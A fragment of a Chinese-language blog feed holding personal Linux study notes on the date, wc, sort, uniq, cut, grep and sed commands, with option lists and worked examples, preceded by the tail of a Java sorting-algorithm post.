比较排序，时间复杂度 O(nlogn) ~ O(n^2)，主要有：冒泡排序，选择排序，插入排序， 归并排序，堆排序，快速排序等。 非比较排序，时间复杂度可以达到 O(n)，主要有：计数排序，基数排序，桶排序等。 4.2 常见排序的时间复杂度 有趣的排序算法视频 4.3 常见排序算法的核心实现4.3.1 冒泡排序 4.3.2 归并排序 4.3.3 快速排序]]></content>
      <categories>
        <category>Java</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux学习笔记-5]]></title>
    <url>%2F2018%2F05%2F28%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5%2F</url>
    <content type="text"><![CDATA[1.Shell操作日期时间date在类UNIX系统中，日期被存储为一个整数，其大小为自世界标准时间（UTC）1970年1月1日0时0分0秒起流逝的秒数。 语法 1date(选项)(参数) 选项 12345-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号；-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号；-u：显示GMT, 即目前的格林威治时间；--help：在线帮助；--version：显示版本信息。 参数 &lt;+时间日期格式&gt;：指定显示时使用的日期时间格式。 日期格式字符串列表 123456789101112131415161718192021222324%r 时间，12小时制%s 从1970年1月1日0点到目前经历的秒数%S 秒（00～59） %T 时间（24小时制）（hh:mm:ss）%X 显示时间的格式（％H时％M分％S秒）%Z 按字母表排序的时区缩写%a 星期名缩写%A 星期名全称%b 月名缩写%B 月名全称%c 日期和时间%d 按月计的日期（01～31）%D 日期（mm/dd/yy） %h 和%b选项相同%j 一年的第几天（001~366）%m 月份（01～12）%w 一个星期的第几天（0代表星期天）%W 一年的第几个星期（00～53，星期一为第一天）%x 显示日期的格式（mm/dd/yy）%y 年份的最后两个数字（1999则是99）%Y 年份（比如1970、1996等）%C 世纪，通常为省略当前年份的后两位数字%U 一年中的第几周，以周日为每星期第一天%e 按月计的日期，添加空格，等于%_d 实例 格式化输出 12date +"%Y-%m-%d"2009-12-07 输出昨天日期： 12date -d "1 day ago" +"%Y-%m-%d"2012-11-19 2秒后输出： 12date -d "2 second" +"%Y-%m-%d %H:%M.%S"2012-11-20 14:21.31 传说中的 1234567890 秒： 12date -d "1970-01-01 1234567890 seconds" +"%Y-%m-%d %H:%m:%S"2009-02-13 23:02:30 普通转格式： 12date -d "2009-12-12" +"%Y/%m/%d %H:%M.%S"2009/12/12 00:00.00 apache格式转换： 12date -d "Dec 5, 2009 12:00:37 AM" +"%Y-%m-%d %H:%M.%S"2009-12-05 00:00.37 格式转换后时间游走： 12date -d "Dec 5, 2009 12:00:37 AM 2 year ago" +"%Y-%m-%d %H:%M.%S"2007-12-05 00:00.37 加减操作： 1234567date +%Y%m%d //显示前天年月日date -d "+1 day" +%Y%m%d //显示前一天的日期date -d "-1 day" +%Y%m%d //显示后一天的日期date -d "-1 month" +%Y%m%d //显示上一月的日期date -d "+1 month" +%Y%m%d //显示下一月的日期date -d "-1 year" +%Y%m%d //显示前一年的日期date -d "+1 year" +%Y%m%d //显示下一年的日期 设定时间： 1234567date -s //设置当前时间，只有root权限才能设置，其他只能查看date -s 20120523 //设置成20120523，这样会把具体时间设置成空00:00:00date -s 01:01:01 //设置具体时间，不会对日期做更改date -s "01:01:01 2012-05-23" //这样可以设置全部时间date -s "01:01:01 20120523" //这样可以设置全部时间date -s "2012-05-23 01:01:01" //这样可以设置全部时间date -s "20120523 01:01:01" //这样可以设置全部时间 有时需要检查一组命令花费的时间，举例： 12345678#!/bin/bashstart=$(date +%s)nmap man.linuxde.net &amp;&gt; /dev/nullend=$(date +%s)difference=$(( end - start ))echo $difference seconds. 计算活了多少年 1echo $[($(date +%s -d $[date])-$(date +%s -d "19900318"))/86400/365] date -d其它的一些用法. 123456789101112131415161718192021222324252627## 获取下一天的时间[root@hadoop ~]# date -d next-day '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d 'next day' '+%Y-%m-%d %H:%M:%S'另外一种写法：[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' -d tomorrow## 获取上一天的时间 [root@hadoop ~]# date -d last-day '+%Y-%m-%d %H:%M:%S'另外一种写法：[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' -d yesterday## 获取下一月的时间[root@hadoop ~]# date -d next-month '+%Y-%m-%d %H:%M:%S'## 获取上一月的时间 [root@hadoop ~]# date -d last-month '+%Y-%m-%d %H:%M:%S'## 获取下一年的时间[root@hadoop ~]# date -d next-year '+%Y-%m-%d %H:%M:%S'## 获取上一年的时间 [root@hadoop ~]# date -d last-year '+%Y-%m-%d %H:%M:%S'## 获取上一周的日期时间：[root@hadoop ~]# date -d next-week '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d next-monday '+%Y-%m-%d %H:%M:%S'[root@hadoop ~]# date -d next-thursday '+%Y-%m-%d %H:%M:%S' 那么类似的，其实，last-year，last-month，last-day，last-week，last-hour，last-minute，last-second都有对应的实现。相反的，last对应next，自己可以根据实际情况灵活组织 接下来，我们来看‘–date’，它帮我实现任意时间前后的计算，来看具体的例子： 1234567## 获取一天以后的日期时间[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='1 day'[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='-1 day ago'## 获取一天以前的日期时间[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='-1 day'[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' --date='1 day ago' 上面的例子显示出来了使用的格式，使用精髓在于改变前面的字符串显示格式，改变数据，改变要操作的日期对应字段，除了天也有对应的其他实现：year，month，week，day，hour，minute，second，monday（星期，七天都可） date 能用来显示或设定系统的日期和时间，在显示方面，使用者能设定欲显示的格式，格式设定为一个加号后接数个标记，其中可用的标记列表如下： 使用范例： 1[root@hadoop ~]# date '+%Y-%m-%d %H:%M:%S' 日期方面 12345678910111213141516%a : 星期几 (Sun..Sat) %A : 星期几 (Sunday..Saturday) %b : 月份 (Jan..Dec) %B : 月份 (January..December) %c : 直接显示日期和时间 %d : 日 (01..31) %D : 直接显示日期 (mm/dd/yy) %h : 同 %b %j : 一年中的第几天 (001..366) %m : 月份 (01..12) %U : 一年中的第几周 (00..53) (以 Sunday 为一周的第一天的情形) %w : 一周中的第几天 (0..6) %W : 一年中的第几周 (00..53) (以 Monday 为一周的第一天的情形) %x : 直接显示日期 (mm/dd/yyyy) %y : 年份的最后两位数字 (00.99) %Y : 完整年份 (0000..9999) 时间方面 123456789101112131415%%: 打印出%%n : 下一行%t : 跳格%H : 小时(00..23)%k : 小时(0..23)%l : 小时(1..12)%M : 分钟(00..59)%p : 显示本地AM或PM%P : 显示本地am或pm%r : 直接显示时间(12 小时制，格式为 hh:mm:ss [AP]M)%s : 从 1970 年 1 月 1 日 00:00:00 UTC 到目前为止的秒数%S : 秒(00..61)%T : 直接显示时间(24小时制)%X : 相当于%H:%M:%S %p%Z : 显示时区 若是不以加号作为开头，则表示要设定时间，而时间格式为 MMDDhhmm[[CC]YY][.ss] 1234567MM 为月份， DD 为日，hh 为小时，mm 为分钟，CC 为年份前两位数字，YY 为年份后两位数字，ss 为秒数 有用的小技巧12345678910111213141516171819202122## 获取相对某个日期前后的日期：cts1 ~ # date -d 'may 14 -2 weeks'2018年 04月 30日 星期一 00:00:00 CST## 把时间当中无用的0去掉，比如：01:02:25会变成1:2:25cts1 ~ # date '+%-H:%-M:%-S'19:18:22## 显示文件最后被更改的时间cts1 ~ # date "+%Y-%m-%d %H:%M:%S" -r install.log2018-05-23 10:11:14## 求两个字符串日期之间相隔的天数[root@hadoop ~]# expr '(' $(date +%s -d "2016-08-08") - $(date +%s -d "2016-09-09") ')' / 86400expr `expr $(date +%s -d "2016-08-08") - $(date +%s -d "2016-09-09")` / 86400## shell中加减指定间隔单位cts1 ~ # A=`date +%Y-%m-%d`cts1 ~ # B=`date +%Y-%m-%d -d "$A +48 hours"`cts1 ~ # echo $B2018-05-30 2. 文本处理wc功能： 统计文件行数、字节、字符数 选项1234567-c # 统计字节数，或--bytes或——chars：只显示Bytes数；。-l # 统计行数，或——lines：只显示列数；。-m # 统计字符数。这个标志不能与 -c 标志一起使用。-w # 统计字数，或——words：只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。-L # 打印最长行的长度。-help # 显示帮助信息--version # 显示版本信息 例子123456789101112131415161718192021222324wc -l * # 统计当前目录下的所有文件行数wc -l *.js # 统计当前目录下的所有 .js 后缀的文件行数find . * | xargs wc -l # 当前目录以及子目录的所有文件行数 wc test.txt # 查看文件的字节数、字数、行数# 查看文件的字节数、字数、行数wc test.txt# 输出结果7 8 70 test.txt行数 单词数 字节数 文件名# 用wc命令只打印统计文件行数不打印文件名wc -l test.txt # 输出结果7 test.txt# 用来统计当前目录下的文件数ls -l | wc -l# 输出结果8# 统计文件字数：cts1 ~ # wc -w date.txt30 date.txt sortsort命令 是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。 选项123456789101112131415-b：忽略每行前面开始出的空格字符；-c：检查文件是否已经按照顺序排序；-d：排序时，处理英文字母、数字及空格字符外，忽略其他的字符；-f：排序时，将小写字母视为大写字母；-i：排序时，除了040至176之间的ASCII字符外，忽略其他的字符；-m：将几个排序号的文件进行合并；-M：将前面3个字母依照月份的缩写进行排序；-n：依照数值的大小排序；-o&lt;输出文件&gt;：将排序后的结果存入制定的文件；-r：以相反的顺序来排序；-t&lt;分隔字符&gt;：指定排序时所用的栏位分隔字符；-g：按照常规数值排序-k：位置1,位置2根据关键字排序，在从第位置1开始，位置2结束+&lt;起始栏位&gt;-&lt;结束栏位&gt;：以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。 实例 sort将文件/文本的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 123456789101112131415root@[mail text]# cat sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root@mail text]# sort sort.txtaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5eee:50:5.5 忽略相同行使用-u选项或者uniq： 1234567891011121314151617181920212223[root@mail text]# cat sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root@mail text]# sort -u sort.txtaaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5或者[root@mail text]# uniq sort.txtaaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5 sort的-n、-r、-k、-t选项的使用： 123456789101112131415161718192021222324252627282930313233[root@mail text]# cat sort.txtAAA:BB:CCaaa:30:1.6ccc:50:3.3ddd:20:4.2bbb:10:2.5eee:40:5.4eee:60:5.1#将BB列按照数字从小到大顺序排列：[root@mail text]# sort -nk 2 -t: sort.txtAAA:BB:CCbbb:10:2.5ddd:20:4.2aaa:30:1.6eee:40:5.4ccc:50:3.3eee:60:5.1#将CC列数字从大到小顺序排列：[root@mail text]# sort -nrk 3 -t: sort.txteee:40:5.4eee:60:5.1ddd:20:4.2ccc:50:3.3bbb:10:2.5aaa:30:1.6AAA:BB:CC# -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号# 多列排序：以:分隔，按第二列数值排倒序，第三列正序[linux@linux ~]$ sort -n -t: -k2,2r -k3 sort.txt -k选项的具体语法格式： x,x 表示一个范围 123FStart.CStart Modifie,FEnd.CEnd Modifier-------Start--------,-------End-------- FStart.CStart 选项 , FEnd.CEnd 选项 这个语法格式可以被其中的逗号,分为两大部分， Start 部分和 End 部分。Start部分也由三部分组成，其中的Modifier部分就是我们之前说过的类似n和r的选项部分。我们重点说说Start部分的FStart和C.Start。C.Start也是可以省略的，省略的话就表示从本域的开头部分开始。FStart.CStart，其中FStart就是表示使用的域，而CStart则表示在FStart域中从第几个字符开始算“排序首字符”。同理，在End部分中，你可以设定FEnd.CEnd，如果你省略.CEnd，则表示结尾到“域尾”，即本域的最后一个字符。或者，如果你将CEnd设定为0(零)，也是表示结尾到“域尾”。 从公司英文名称的第二个字母开始进行排序： 1234567# 先创建此txt文件# 再排序$ sort -t ' ' -k 1.2 facebook.txtbaidu 100 5000sohu 100 4500google 110 5000guge 50 3000 -t &#39; &#39;, 首先用&#39; &#39;空格, 把字段分割成了3个域. 使用了-k 1.2，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和 google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。 只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序： 12345$ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txtbaidu 100 5000google 110 5000sohu 100 4500guge 50 3000 由于只对第二个字母进行排序，所以我们使用了-k 1.2,1.2的表示方式，表示我们“只”对第二个字母进行排序。（如果你问“我使用-k 1.2怎么不行？”，当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。对于员工工资进行排 序，我们也使用了-k 3,3，这是最准确的表述，表示我们“只”对本域进行排序，因为如果你省略了后面的3，就变成了我们“对第3个域开始到最后一个域位置的内容进行排序” 了。 uniquniq命令 用于报告或忽略文件中的重复行，一般与sort命令结合使用。 选项123456-c或——count：在每列旁边显示该行重复出现的次数；-d或--repeated：仅显示重复出现的行列；-f&lt;栏位&gt;或--skip-fields=&lt;栏位&gt;：忽略比较指定的栏位；-s&lt;字符位置&gt;或--skip-chars=&lt;字符位置&gt;：忽略比较指定的字符；-u或——unique：仅显示出一次的行列；-w&lt;字符位置&gt;或--check-chars=&lt;字符位置&gt;：指定要比较的字符。 参数 输入文件：指定要去除的重复行文件。如果不指定此项，则从标准读取数据； 输出文件：指定要去除重复行后的内容要写入的输出文件。如果不指定此选项，则将内容显示到标准输出设备（显示终端）。 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[root]# cat sort.txt : 原本行aaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5eee:50:5.5[root]# uniq sort.txt : 不展示重复行aaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2eee:50:5.5[cts1:Desktop][cts1:Desktop][root]# sort sort.txt | uniq : 不展示重复行aaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4eee:50:5.5[cts1:Desktop][root]# uniq -u sort.txt : 删除重复行aaa:10:1.1ccc:30:3.3ddd:40:4.4bbb:20:2.2[cts1:Desktop][root]# sort sort.txt | uniq -u : 排序并删除重复行aaa:10:1.1bbb:20:2.2ccc:30:3.3ddd:40:4.4[cts1:Desktop][root]# sort sort.txt | uniq -c : 展示每行出现的次数 1 aaa:10:1.1 1 bbb:20:2.2 1 ccc:30:3.3 1 ddd:40:4.4 2 eee:50:5.5[cts1:Desktop][root]# sort sort.txt | uniq -d : 只展示重复行eee:50:5.5# 求a.txt和b.txt的差集 ## 首先a b 去掉重复的, 再跟a b去重, 把b其它的部分也去掉cts1 Desktop # cat a b b | sort | uniq -uab# 求b.txt和a.txt的差集 ## 同上cts1 Desktop # cat b a a | sort | uniq -uef cutcut命令 用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的type命令。 说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数file所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如cut fl f2 &gt; f3将把文件fl和几的内容合并起来，然后通过输出重定向符“&gt;”的作用，将它们放入文件f3中。 当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用more等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。 选项123456789-b：仅显示行中指定直接范围的内容；-c：仅显示行中指定范围的字符； -d：指定字段的分隔符，默认的字段分隔符为“TAB”； -f：显示指定字段的内容；-n：与“-b”选项连用，不分割多字节字符；--complement：补足被选择的字节、字符或字段；--out-delimiter=&lt;字段分隔符&gt;：指定输出内容是的字段分割符；--help：显示指令的帮助信息；--version：显示指令的版本信息。 参数文件：指定要进行内容过滤的文件。 实例例如有一个学生报表信息，包含No、Name、Mark、Percent： 12345[root@localhost text]# cat cut.txt No Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98 -f使用-f 选项提取指定字段 12345[root@localhost text]# cut -d ' ' -f1 cut.txt No010203 12345[root@localhost text]# cut -d ' ' -f2,3 test.txt Name Marktom 69jack 71alex 68 –complement选项提取指定字段之外的列（打印除了第二列之外的列）： 12345cut -d ' ' -f2 --complement cut.txtNo Mark Percent01 69 9102 71 8703 68 98 指定字段的字符或者字节范围 &amp; 例子cut命令可以将一串字符作为列来显示，字符字段的记法： N- ：从第N个字节、字符、字段到结尾； N-M ：从第N个字节、字符、字段到第M个（包括M在内）字节、字符、字段； -M ：从第1个字节、字符、字段到第M个（包括M在内）字节、字符、字段。 上面是记法，结合下面选项将摸个范围的字节、字符指定为字段： -b 表示字节； -c 表示字符； -f 表示定义字段。 实例123456789101112131415161718192021222324252627282930[root@localhost text]# cat test.txt abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz# 打印第1个到第3个字符：cut -c1-3 test.txt abcabcabcabcabc# 打印前2个字符：cut -c-2 test.txt ababababab# 打印从第5个字符开始到结尾：cut -c5- test.txt efghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyzefghijklmnopqrstuvwxyz grep(文本生成器)grep （global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。用于过滤/搜索的特定字符。可使用正则表达式能多种命令配合使用，使用上十分灵活。 选项123456789101112131415161718192021222324252627-a --text # 不要忽略二进制数据。-A &lt;显示行数&gt; --after-context=&lt;显示行数&gt; # 除了显示符合范本样式的那一行之外，并显示该行之后的内容。-b --byte-offset # 在显示符合范本样式的那一行之外，并显示该行之前的内容。-B&lt;显示行数&gt; --before-context=&lt;显示行数&gt; # 除了显示符合样式的那一行之外，并显示该行之前的内容。-c --count # 计算符合范本样式的列数。-C&lt;显示行数&gt; --context=&lt;显示行数&gt;或-&lt;显示行数&gt; # 除了显示符合范本样式的那一列之外，并显示该列之前后的内容。-d&lt;进行动作&gt; --directories=&lt;动作&gt; # 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。-e&lt;范本样式&gt; --regexp=&lt;范本样式&gt; # 指定字符串作为查找文件内容的范本样式。-E --extended-regexp # 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。-f&lt;范本文件&gt; --file=&lt;规则文件&gt; # 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。-F --fixed-regexp # 将范本样式视为固定字符串的列表。-G --basic-regexp # 将范本样式视为普通的表示法来使用。-h --no-filename # 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。-H --with-filename # 在显示符合范本样式的那一列之前，标示该列的文件名称。-i --ignore-case # 忽略字符大小写的差别。-l --file-with-matches # 列出文件内容符合指定的范本样式的文件名称。-L --files-without-match # 列出文件内容不符合指定的范本样式的文件名称。-n --line-number # 在显示符合范本样式的那一列之前，标示出该列的编号。-q --quiet或--silent # 不显示任何信息。-R/-r --recursive # 此参数的效果和指定“-d recurse”参数相同。-s --no-messages # 不显示错误信息。-v --revert-match # 反转查找。-V --version # 显示版本信息。 -w --word-regexp # 只显示全字符合的列。-x --line-regexp # 只显示全列符合的列。-y # 此参数效果跟“-i”相同。-o # 只输出文件中匹配到的部分。 grep中的正则表达式12345678910111213141516171819202122232425&lt;sup&gt; # 锚定行的开始 如：'&lt;/sup&gt;grep'匹配所有以grep开头的行。 $ # 锚定行的结束 如：'grep$'匹配所有以grep结尾的行。 . # 匹配一个非换行符的字符 如：'gr.p'匹配gr后接一个任意字符，然后是p。 * # 匹配零个或多个先前字符 如：'*grep'匹配所有一个或多个空格后紧跟grep的行。 .* # 一起用代表任意字符。 [] # 匹配一个指定范围内的字符，如'[Gg]rep'匹配Grep和grep。 [&lt;sup&gt;] # 匹配一个不在指定范围内的字符，如：'[&lt;/sup&gt;A-FH-Z]rep'匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。 \ # 转义\(..\) # 标记匹配字符，如'\(love\)'，love被标记为1。 \&lt; # 锚定单词的开始，如:'\&lt;grep'匹配包含以grep开头的单词的行。 \&gt; # 锚定单词的结束，如'grep\&gt;'匹配包含以grep结尾的单词的行。 x\&#123;m\&#125; # 重复字符x，m次，如：'o\&#123;5\&#125;'匹配包含5个o的行。 x\&#123;m,\&#125; # 重复字符x,至少m次，如：'o\&#123;5,\&#125;'匹配至少有5个o的行。 x\&#123;m,n\&#125; # 重复字符x，至少m次，不多于n次，如：'o\&#123;5,10\&#125;'匹配5--10个o的行。 \w # 匹配文字和数字字符，也就是[A-Za-z0-9]，如：'G\w*p'匹配以G后跟零个或多个文字或数字字符，然后是p。 \W # \w的反置形式，匹配一个或多个非单词字符，如点号句号等。 \b # 单词锁定符，如: '\bgrep\b'只匹配grep。增录. # 任意一个字符a* # 任意多个a(0个或多个)a? # 0个或1个aa+ # 一个或多个a[A-Z][ABC] grep命令常见用法 在文件中搜索一个单词，命令会返回一个包含 “match_pattern” 的文本行： 12grep match_pattern file_namegrep "match_pattern" file_name 在多个文件中查找 1grep "match_pattern" file_1 file_2 file_3 ... 输出除 “match_pattern” 之外的所有行 &gt;&gt; -v 选项： 1grep -v "match_pattern" file_name 标记匹配颜色 –color=auto 选项： 12345678910grep "match_pattern" file_name --color=autoeg: 查找当前目录下所有文件中的 `a`cts1 Desktop # grep "\(a\)" ./* --color=auto---./a:a./abc.txt:abcdefghijklmnopqrstuvwxyz./abc.txt:abcdefghijklmnopqrstuvwxyz./abc.txt:abcdefghijklmnopqrstuvwxyz... 使用正则表达式 -E 选项：123grep -E "[1-9]+"或egrep "[1-9]+" 只输出文件中匹配到的部分 -o 选项： 12345echo this is a test line. | grep -o -E "[a-z]+\."line.echo this is a test line. | egrep -o "[a-z]+\."line. 统计文件或者文本中包含匹配字符串的行数 -c 选项： 1grep -c "text" file_name 输出包含匹配字符串的行数 -n 选项： 123456grep "text" -n file_name或cat file_name | grep "text" -n#多个文件grep "text" -n file_1 file_2 打印样式匹配所位于的字符或字节偏移 1234echo gun is not unix | grep -b -o "not"7:not#一行中字符串的字符便宜是从该行的第一个字符开始计算，起始值为0。选项 **-b -o** 一般总是配合使用。 搜索多个文件并查找匹配文本在哪些文件中 1grep -l "text" file1 file2 file3... grep递归搜索文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 在多级目录中对文本进行递归搜索grep "text" . -r -n# .表示当前目录。# 忽略匹配样式中的字符大小写echo "hello world" | grep -i "HELLO"hello# 选项 -e 制动多个匹配样式：echo this is a text line | grep -e "is" -e "line" -oisline#也可以使用 **-f** 选项来匹配多个样式，在样式文件中逐行写出需要匹配的字符。cat patfileaaabbb# 用文件名称匹配, 实际上就是匹配文件中的内容echo aaa bbb ccc ddd eee | grep -f patfile -oaaabbb# 在grep搜索结果中包括或者排除指定文件：---#只在目录中所有的.php和.html文件中递归搜索字符"main()"grep "main()" . -r --include *.&#123;php,html&#125;#在搜索结果中排除所有README文件grep "main()" . -r --exclude "README"#在搜索结果中排除filelist文件列表里的文件grep "main()" . -r --exclude-from filelist---# 使用0值字节后缀的grep与xargs：---# 测试文件：echo "aaa" &gt; file1echo "bbb" &gt; file2echo "aaa" &gt; file3grep "aaa" file* -lZ | xargs -0 rm#执行后会删除file1和file3，grep输出用-Z选项来指定以0值字节作为终结符文件名（\0），xargs -0 读取输入并用0值字节终结符分隔文件名，然后删除匹配文件，-Z通常和-l结合使用。# 好吧, 暂时我也没懂是啥意思...---# grep静默输出：grep -q "test" filename# 不会输出任何信息，如果命令运行成功返回0，失败则返回非0值。一般用于条件测试。# 打印出匹配文本之前或者之后的行：# 显示匹配某个结果之后的3行，使用 -A 选项：seq 10 | grep "5" -A 35678# 显示匹配某个结果之前的3行，使用 -B 选项：seq 10 | grep "5" -B 32345# 显示匹配某个结果的前三行和后三行，使用 -C 选项：seq 10 | grep "5" -C 32345678# 如果匹配结果有多个，会用“--”作为各匹配结果之间的分隔符：echo -e "a\nb\nc\na\nb\nc" | grep a -A 1ab--ab grep其它常用用法12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 统计出现某个字符串的行的总行数 '-c'cts1 Desktop # echo "hello" &gt;&gt; hello.shcts1 Desktop # grep -c 'hello' hello.sh1# 查询不包含hello的行, 带有hello的整行都不会被查询到 '-v'cts1 Desktop # grep -v 'hello' hello.sh....# `.*`的用法, 前后都是 `.*` , 只要包含 parrten 的 整行 都会被查出来grep '.*hello.*' hello.sh# 任何由 'h..p'包含的都会被查出来. 查的当前行, .* 代表任意字符cts1 Desktop # grep 'h.*p' /etc/passwdgopher:x:13:30:gopher:/var/gopher:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nolo# 正则表达以 ro 开头cts1 Desktop # grep '^ro' /etc/passwdroot:x:0:0:root:/root:/bin/zsh# 正则表达以 t 结尾cts1 Desktop # grep 't$' /etc/passwdhalt:x:7:0:halt:/sbin:/sbin/halt# '[Gg]rep'匹配Grep和grep## 此处是匹配 以 h || r 开头的cts1 Desktop # grep '^[hr]' /etc/passwdroot:x:0:0:root:/root:/bin/zshhalt:x:7:0:halt:/sbin:/sbin/haltrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin# 匹配非h之外其他的, 和 r 开头的, 也就是匹配 h以外的cts1 Desktop # grep '^[hr]' /etc/passwdroot:x:0:0:root:/root:/bin/zshhalt:x:7:0:halt:/sbin:/sbin/haltrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin# 匹配 h-r 以外的cts1 Desktop # grep '&lt;sup&gt;[&lt;/sup&gt;h-r]' /etc/passwdbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologin... sed(流编辑器)sed叫做流编辑器，在shell脚本和Makefile中作为过滤一使用非常普遍，也就是把前一个程序的输出引入sed的输入，经过一系列编辑命令转换成为另一种格式输出。sed是一种在线编辑器，它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为”模式空间”,接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。 选项12345678910111213-n：一般sed命令会把所有数据都输出到屏幕，如果加入-n选项的话，则只会把经过sed命令处理的行输出到屏幕。-e&lt;script&gt;或--expression=&lt;script&gt;：以选项中的指定的script来处理输入的文本文件； 允许对输入数据应用多条sed命令编辑。-i：用sed的修改结果直接修改读取数据的文件，而不是由屏幕输出。-f&lt;script文件&gt;或--file=&lt;script文件&gt;：以选项中指定的script文件来处理输入的文本文件；-n或--quiet或——silent：仅显示script处理后的结果；--version：显示版本信息。# 动作:a：追加，在当前行后添加一行或多行。c：行替换，用c后面的字符串替换原数据行。i：插入，在当前行前插入一行或多行。p：打印，输出指定的行。s：字符串替换，用一个字符串替换另外一个字符串。格式为**\'**行范围s/旧字符串/新字符串/g**\'** (如果不加g的话，则表示只替换每行第一个匹配的串) sed元字符集(正则)12345678910111213**&lt;sup&gt;** 匹配行开始，如：/&lt;/sup&gt;sed/匹配所有以sed开头的行。**$** 匹配行结束，如：/sed$/匹配所有以sed结尾的行。**.** 匹配一个非换行符的任意字符，如：/s.d/匹配s后接一个任意字符，最后是d。**** * 匹配0个或多个字符，如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。**[]** 匹配一个指定范围内的字符，如/[ss]ed/匹配sed和Sed。 **[&lt;sup&gt;]** 匹配一个不在指定范围内的字符，如：/[&lt;/sup&gt;A-RT-Z]ed/匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。**\(..\)** 匹配子串，保存匹配的字符，如s/\(love\)able/\1rs，loveable被替换成lovers。**&amp;** 保存搜索字符用来替换其他字符，如s/love/ **&amp;** /，love这成 **love** 。**\&lt;** 匹配单词的开始，如:/\&lt;love/匹配包含以love开头的单词的行。**\&gt;** 匹配单词的结束，如/love\&gt;/匹配包含以love结尾的单词的行。**x\&#123;m\&#125;** 重复字符x，m次，如：/0\&#123;5\&#125;/匹配包含5个0的行。**x\&#123;m,\&#125;** 重复字符x，至少m次，如：/0\&#123;5,\&#125;/匹配至少有5个0的行。**x\&#123;m,n\&#125;** 重复字符x，至少m次，不多于n次，如：/0\&#123;5,10\&#125;/匹配5~10个0的行。 实例 删除: d命令 sed ‘2d’ sed.txt —–删除sed.txt文件的第二行。 sed ‘2,$d’ sed.txt —–删除sed.txt文件的第二行到末尾所有行。 sed ‘$d’ sed.txt —–删除sed.txt文件的最后一行。 sed ‘/test/d ‘ sed.txt —–删除sed.txt文件所有包含test的行。 sed ‘/[A-Za-z]/d ‘ sed.txt —–删除sed.txt文件所有包含字母的行。 整行替换: c命令 将第二行替换成hello world sed \’2c hello world\’ sed.txt 字符串替换：s命令 sed ‘s/hello/hi/g’ sed.txt ## 